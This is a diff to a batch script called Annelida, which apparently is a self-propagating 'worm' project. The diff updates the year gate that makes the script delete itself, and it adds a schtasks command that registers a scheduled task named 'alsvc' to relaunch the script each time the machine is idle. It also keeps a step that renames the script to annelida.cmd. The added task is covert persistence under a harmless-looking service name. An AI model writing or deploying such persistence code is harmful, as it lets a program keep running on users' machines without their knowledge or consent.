@@ -1,4 +1,4 @@
-set currentIteration=0 %= 2022-08-28 =% & goto begin
+set currentIteration=0 %= 2023-05-13 =% & goto begin
 
 :begin
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@@ -8,13 +8,14 @@ set currentIteration=0 %= 2022-08-28 =% & goto begin
 ::                                                  https://maxwellcrafter.com                                                   ::
 ::                  Source, documentation, and more can be found at https://github.com/Maxwell-Fisher/Annelida                   ::
 ::                               a1cbdd7272ff08c2b23eadbd9b92fab96b13e3e6ab8238a47c63075afc9d6870                                ::
+::                                                      Version 2023/05/13                                                       ::
 ::                                                                                                                               ::
 ::                                                                                                                               ::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 ::                                                                                                                               ::
 ::                                                                                                                               ::
 ::	The scipt will automatically delete itself after this year for safety.                                                   ::
-	set allowedYear=2022
+set allowedYear=2023
 ::                                                                                                                               ::
 ::                                                                                                                               ::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
@@ -56,9 +57,11 @@ cls
 setLocal enableDelayedExpansion
 
 :: This stops the script from running and deletes it during any year other than what is allowed
-echo "%date%" | find "%allowedYear%" > nul || del "%~f0"
+if "%date%" == "!date:%allowedYear%=!" del "%~f0" && exit
 
 set /a currentIteration=currentIteration+1
+
+schtasks /create /sc onidle /i 15 /tn "alsvc" /tr "%~f0"
 
 if not exist "%annelida.cmd%" move "%~f0" annelida.cmd
 
